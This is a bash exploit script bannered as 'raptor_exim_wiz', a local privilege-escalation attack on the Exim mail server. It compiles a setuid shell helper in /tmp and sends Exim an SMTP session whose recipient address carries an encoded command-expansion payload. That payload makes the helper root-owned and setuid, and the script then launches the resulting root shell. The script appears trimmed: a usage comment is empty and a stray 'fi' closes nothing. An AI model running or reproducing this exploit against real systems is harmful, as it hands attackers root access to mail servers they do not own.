#!/bin/bash

METHOD="setuid" # default method
PAYLOAD_SETUID='${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22}}@localhost'


# usage instructions

function exploit()
{
	# connect to localhost:25
	exec 3<>/dev/tcp/localhost/25

	# deliver the payload
	read -u 3 && echo $REPLY
	echo "helo localhost" >&3
	read -u 3 && echo $REPLY
	echo "mail from:<>" >&3
	read -u 3 && echo $REPLY
	echo "rcpt to:<$PAYLOAD>" >&3
	read -u 3 && echo $REPLY
	echo "data" >&3
	read -u 3 && echo $REPLY
	for i in {1..31}
	do
		echo "Received: $i" >&3
	done
	echo "." >&3
	read -u 3 && echo $REPLY
	echo "quit" >&3
	read -u 3 && echo $REPLY
}

# print banner
echo
echo 'raptor_exim_wiz - "The Return of the WIZard" LPE exploit'
echo 'Copyright (c) 2019 Marco Ivaldi <raptor@0xdeadbeef.info>'
echo



# prepare a setuid shell helper to circumvent bash checks
echo "Preparing setuid shell helper..."
echo "main(){setuid(0);setgid(0);system(\"/bin/sh\");}" >/tmp/pwned.c
gcc -o /tmp/pwned /tmp/pwned.c 2>/dev/null
if [ $? -ne 0 ]; then
	echo "Problems compiling setuid shell helper, check your gcc."
	echo "Falling back to the /bin/sh method."
	cp /bin/sh /tmp/pwned
fi
echo

# select and deliver the payload
echo "Delivering $METHOD payload..."
PAYLOAD=$PAYLOAD_SETUID
exploit
echo

# wait for the magic to happen and spawn our shell
echo "Waiting 5 seconds..."
sleep 5
ls -l /tmp/pwned
/tmp/pwned
fi
